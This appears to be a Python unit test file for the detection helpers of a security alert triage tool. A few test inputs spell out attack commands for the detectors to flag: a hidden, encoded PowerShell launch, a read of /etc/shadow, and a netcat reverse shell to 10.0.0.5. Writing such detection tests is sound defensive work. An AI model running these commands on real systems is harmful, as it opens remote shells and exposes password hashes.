from triagen_core.enrichments.command_flags import scan_command_flags
from triagen_core.enrichments.file_paths import contains_sensitive_path
from triagen_core.enrichments.hostname_check import is_server_name
from triagen_core.enrichments.ip_extractor import extract_ip
from triagen_core.enrichments.network_tools import executes_network_tools
from triagen_core.enrichments.time_heuristics import is_off_hours
from triagen_core.enrichments.user_privilege import is_privileged_user


def test_scan_command_flags_detects_powershell_hidden_window():
    assert scan_command_flags("powershell -nop -w hidden -enc AAAA", os_type="windows") is True


def test_scan_command_flags_ignores_benign_command():
    assert scan_command_flags("dir C:\\Users", os_type="windows") is False


def test_contains_sensitive_path_detects_shadow_file():
    assert contains_sensitive_path("cat /etc/shadow") is True


def test_contains_sensitive_path_ignores_benign_path():
    assert contains_sensitive_path("ls /home/alice/projects") is False


def test_executes_network_tools_detects_netcat_reverse_shell():
    assert executes_network_tools("nc -e /bin/sh 10.0.0.5 4444") is True


def test_executes_network_tools_ignores_benign_command():
    assert executes_network_tools("git status") is False


def test_is_off_hours_flags_late_night_utc():
    assert is_off_hours("2026-07-14T02:13:00Z") is True


def test_is_off_hours_allows_business_hours_utc():
    assert is_off_hours("2026-07-14T10:05:00Z") is False


def test_extract_ip_finds_literal():
    assert extract_ip("connect to 10.0.0.5 now") == ["10.0.0.5"]


def test_extract_ip_returns_empty_list_when_absent():
    assert extract_ip("no ip addresses here") == []


def test_is_privileged_user_detects_service_account():
    assert is_privileged_user("svc_web") is True


def test_is_privileged_user_ignores_regular_user():
    assert is_privileged_user("jsmith") is False


def test_is_server_name_detects_prod_host():
    assert is_server_name("prod-web01") is True


def test_is_server_name_ignores_workstation():
    assert is_server_name("corp-laptop-042") is False
